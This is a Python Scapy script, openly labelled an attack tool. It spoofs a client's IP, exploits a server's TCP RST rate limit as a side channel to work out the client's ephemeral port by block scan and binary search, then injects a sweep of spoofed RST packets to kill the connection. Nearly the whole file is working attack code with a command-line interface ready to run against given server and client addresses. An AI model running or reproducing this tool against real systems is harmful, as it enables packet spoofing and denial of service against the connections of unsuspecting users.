import argparse
import random
import sys
import time
import threading
from scapy.all import IP, TCP, Ether, send, sniff, conf, sendpfast, get_if_hwaddr, getmacbyip

# --- Helper Functions and Thread Class (Unchanged) ---
# ... (Code is the same as before, omitted here) ...
def get_interface_details(target_ip):
    """
    Automatically determines the source IP and interface for a given target IP.
    """
    try:
        route = conf.route.route(target_ip)
        iface = route[0]
        my_ip = route[1]
        return my_ip, iface
    except Exception as e:
        print(f"[ERROR] Could not auto-detect network interface details: {e}")
        sys.exit(1)

class SnifferThread(threading.Thread):
    """
    A simple thread class for running Scapy's sniff function in the background.
    """
    def __init__(self, filter, iface, count=1):
        super().__init__()
        self.filter = filter
        self.iface = iface
        self.count = count
        self.packet = None
        self.daemon = True

    def run(self):
        packets = sniff(filter=self.filter, iface=self.iface, count=self.count)
        if packets:
            self.packet = packets[0]


# --- Core Attack Logic ---

def check_initial_block(server_ip, server_port, client_ip, block_ports, attacker_ip, attacker_iface, dst_mac, timeout):
    """
    Function for the initial large block scan (where block size equals the rate limit).
    """
    print(f"\n[*] [TESTING BLOCK] Ports {block_ports[0]}-{block_ports[-1]} ({len(block_ports)} ports)")

    src_mac = get_if_hwaddr(attacker_iface)
    barrage_packets = []
    for client_port in block_ports:
        eth_layer = Ether(src=src_mac, dst=dst_mac)
        ip_layer = IP(src=client_ip, dst=server_ip)
        tcp_layer = TCP(sport=client_port, dport=server_port, flags="PA", seq=random.randint(0, 2**32 - 1))
        barrage_packets.append(eth_layer / ip_layer / tcp_layer)

    sendpfast(barrage_packets, pps=len(block_ports) * 2, iface=attacker_iface)
    time.sleep(0.01)

    probe_ip = IP(src=attacker_ip, dst=server_ip)
    probe_tcp = TCP(sport=random.randint(1024, 65535), dport=block_ports[0], flags="PA")
    probe_packet = eth_layer / probe_ip / probe_tcp
    
    # ... (Sniffer and subsequent logic are the same as in `check_port_block` from the previous version) ...
    bpf_filter = f"tcp and src host {server_ip} and dst host {attacker_ip} and tcp[tcpflags] & tcp-rst != 0"
    sniffer = SnifferThread(filter=bpf_filter, iface=attacker_iface, count=1)
    sniffer.start()
    sendpfast(probe_packet, iface=attacker_iface) 
    time.sleep(0.1)
    sniffer.join(timeout=timeout)

    if sniffer.packet:
        print(f"    - [RESULT] RST response received. Rate limit NOT triggered -> Target port is likely in this block!")
        return True
    else:
        print(f"    - [RESULT] No RST response. Rate limit WAS triggered -> This block is safe.")
        return False

def check_sub_block_differential(server_ip, server_port, client_ip, sub_block, rate_limit, attacker_ip, attacker_iface, dst_mac, timeout):
    """
    Differential test function for binary search, using padding packets.
    """
    print(f"    - Testing range {sub_block[0]}-{sub_block[-1]} ({len(sub_block)} ports)...", end="", flush=True)

    # 1. Calculate the number of padding packets
    padding_size = rate_limit - len(sub_block)
    if padding_size < 0:
        print("\n[ERROR] Sub-block size is larger than the rate limit. This method is not applicable.")
        return False # Or raise an exception

    # 2. Prepare packets for the test block and padding packets
    src_mac = get_if_hwaddr(attacker_iface)
    all_packets = []
    
    # Packets for the test block
    for port in sub_block:
        eth = Ether(src=src_mac, dst=dst_mac)
        ip = IP(src=client_ip, dst=server_ip)
        tcp = TCP(sport=port, dport=server_port, flags="PA", seq=random.randint(0,2**32-1))
        all_packets.append(eth/ip/tcp)

    # Padding packets
    padding_port = 31337 # A fixed, unrelated port (Leet)
    padding_probe_sport = random.randint(1024, 65535) # The source port of the last padding packet, used for listening
    for i in range(padding_size):
        eth = Ether(src=src_mac, dst=dst_mac)
        # Send padding packets from the attacker's IP to simplify logic
        ip = IP(src=attacker_ip, dst=server_ip)
        # The last packet is our probe, using a specific source port
        sport = padding_probe_sport if i == padding_size - 1 else random.randint(1024, 65535)
        tcp = TCP(sport=sport, dport=padding_port, flags="PA", seq=random.randint(0,2**32-1))
        all_packets.append(eth/ip/tcp)

    # 3. Listen for a response to the last padding packet (the probe)
    bpf_filter = (
        f"tcp and src host {server_ip} and dst host {attacker_ip} "
        f"and src port {padding_port} and dst port {padding_probe_sport} "
        f"and tcp[tcpflags] & tcp-rst != 0"
    )

    # 4. Send all packets at high speed in one burst
    sendpfast(all_packets, pps=rate_limit * 3, iface=attacker_iface)
    time.sleep(0.01)

    sniffer = SnifferThread(filter=bpf_filter, iface=attacker_iface)
    sniffer.start()
    
    # Resend the last packet to ensure it's processed after the sniffer starts
    sendpfast(all_packets[-1:], pps=rate_limit * 3, iface=attacker_iface)
    time.sleep(0.1)
    sniffer.join(timeout=timeout)

    # 5. Return the result based on the logic
    if sniffer.packet:
        print(" [RST Received! Hit.]")
        return True # RST received -> Target is in this block
    else:
        print(" [No RST. Miss.]")
        return False # No RST -> Target is not in this block

# --- Binary Search Function (Modified to Call New Function) ---
def binary_search_port(server_ip, server_port, client_ip, candidate_ports, rate_limit, attacker_ip, attacker_iface, dst_mac, timeout):
    """
    Performs a binary search on a range of ports to pinpoint the exact one.
    """
    print("\n" + "="*20 + "  STARTING DIFFERENTIAL BINARY SEARCH  " + "="*20)
    
    search_space = list(candidate_ports)
    
    while len(search_space) > 1:
        mid = len(search_space) // 2
        lower_half = search_space[:mid]
        
        if not lower_half: break

        is_in_lower_half = check_sub_block_differential(
            server_ip, server_port, client_ip, lower_half,
            rate_limit, attacker_ip, attacker_iface, dst_mac, timeout
        )
        
        if is_in_lower_half:
            search_space = lower_half
        else:
            search_space = search_space[mid:]
            
        time.sleep(1) # Cooldown period to let the rate limit reset

    if len(search_space) == 1:
        return search_space[0]
    else:
        print("\n[WARN] Binary search could not isolate a single port. Remaining candidates:", search_space)
        return None


def inject_rst_sweep(server_ip, server_port, client_ip, found_port, attacker_iface, dst_mac):
    """
    Inject RST packets to terminate connection。
    """
    print("\n" + "="*20 + "  PHASE 3: RST INJECTION ATTACK  " + "="*20)
    print(f"[ATTACK] Target Connection: {client_ip}:{found_port} <--> {server_ip}:{server_port}")
    print("[ATTACK] Mode: Single full sequence number sweep.")

    src_mac = get_if_hwaddr(attacker_iface)
    
    # template
    eth_base = Ether(src=src_mac, dst=dst_mac)
    ip_base = IP(src=client_ip, dst=server_ip)
    tcp_base = TCP(sport=found_port, dport=server_port, flags="R")

    SEQ_SPACE = 2**32
    STEP = 2**20  # 1048576
    
    print(f"\n[*] Preparing a full sweep of {SEQ_SPACE // STEP} RST packets...")
    
    # 1. 准备一次完整扫描的所有RST包
    rst_packets_sweep = []
    for seq_num in range(0, SEQ_SPACE, STEP):
        tcp_base.seq = seq_num
        rst_packet = eth_base / ip_base / tcp_base
        rst_packets_sweep.append(rst_packet)
    
    # 2. 高速发送这一批RST包
    print(f"[*] Injecting sweep... (pps: {len(rst_packets_sweep)})")
    sendpfast(rst_packets_sweep, pps=len(rst_packets_sweep), iface=attacker_iface)
    
    # 3. 结束
    print("[+] RST injection sweep complete. Program finished.")
    

# --- Main Scanning Logic (Unchanged, but function calls renamed) ---
def find_port_and_pinpoint(server_ip, server_port, client_ip, full_port_range, block_size, attacker_ip, attacker_iface, dst_mac, timeout):
    # ... (Same as the previous version, but calls `check_initial_block` and `binary_search_port`)
    print("=" * 60)
    print("      Client-Side TCP Port Finder (Block Scan + Differential Binary Search)")
    print("=" * 60)
    print(f"[SERVER] {server_ip}:{server_port}")
    print(f"[TARGET CLIENT] {client_ip}")
    print(f"[ATTACKER] Iface: {attacker_iface}, Next-Hop-MAC: {dst_mac}")
    print(f"[SCAN] Range: {full_port_range[0]}-{full_port_range[-1]}, Rate Limit/Block Size: {block_size}")
    print("-" * 60)

    for i in range(0, len(full_port_range), block_size):
        port_block = full_port_range[i : i + block_size]
        if not port_block or len(port_block) != block_size: continue

        is_potential_block = check_initial_block(
            server_ip, server_port, client_ip, port_block, 
            attacker_ip, attacker_iface, dst_mac, timeout
        )

        if is_potential_block:
            print("\n[+] POTENTIAL RANGE FOUND: " f"{port_block[0]}-{port_block[-1]}")
            
            # block_size is passed as rate_limit here
            found_port = binary_search_port(
                server_ip, server_port, client_ip, port_block,
                block_size, attacker_ip, attacker_iface, dst_mac, timeout
            )
            
            if found_port:
                print("\n" + "="*25 + "  TARGET PINPOINTED!  " + "="*25)
                print(f"[!!!] Inferred Client Port: {found_port}")
                print(f"[!!!] Suspected Connection: {client_ip}:{found_port} <--> {server_ip}:{server_port}")
                print("="*70)
                inject_rst_sweep(server_ip, server_port, client_ip, found_port, attacker_iface, dst_mac)
            else:
                print("\n[!] Binary search failed to isolate a single port.")
                
            return
        
        time.sleep(1) # Cooldown between initial block checks
    
    print("\n" + "-"*60)
    print("[CONCLUSION] Full scan completed. No potential blocks found.")
    print("-" * 60)

if __name__ == "__main__":
    # --- Command-line Argument Parsing Section (Unchanged) ---
    # ... (Omitted) ...
    parser = argparse.ArgumentParser(
        description="A tool that finds a client's ephemeral port by exploiting RST rate-limits, using block scan and binary search.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    # ... (Identical to the previous version) ...
    parser.add_argument("--server-ip", required=True, help="The IP address of the known server.")
    parser.add_argument("--server-port", required=True, type=int, help="The fixed service port of the known server (e.g., 22, 80, 443).")
    parser.add_argument("--client-ip", required=True, help="The IP address of the client whose port we want to find.")
    parser.add_argument("--port-range", default="1024-65535", help="The total ephemeral port range to scan on the client (e.g., '1024-65535').")
    parser.add_argument("--block-size", type=int, default=1000, help="The size of the port block to check at a time, which also acts as the threshold for the RST rate limit.")
    parser.add_argument("--timeout", type=float, default=1.0, help="The timeout in seconds to wait for a confirming RST response.")
    args = parser.parse_args()

    try:
        start_port, end_port = map(int, args.port_range.split('-'))
        full_port_range = list(range(start_port, end_port + 1))
    except ValueError:
        print("[ERROR] Invalid port range format. Please use 'start-end' format.")
        sys.exit(1)

    attacker_ip, attacker_iface = get_interface_details(args.server_ip)
    
    try:
        # The MAC address needed is that of the next hop (usually the gateway) to reach the server.
        dst_mac = getmacbyip(args.server_ip)
        if not dst_mac:
             raise Exception("getmacbyip returned None.")
        print(f"[INFO] Next-hop MAC for {args.server_ip} resolved to: {dst_mac}")
    except Exception as e:
        print(f"[ERROR] Could not resolve MAC address for {args.server_ip}: {e}")
        print("[INFO] This can happen if the target is not on the local network. Ensure ARP is working.")
        sys.exit(1)
   
    find_port_and_pinpoint(
        server_ip=args.server_ip, 
        server_port=args.server_port, 
        client_ip=args.client_ip,
        full_port_range=full_port_range,
        block_size=args.block_size,
        attacker_ip=attacker_ip,
        attacker_iface=attacker_iface,
        dst_mac=dst_mac,
        timeout=args.timeout
    )
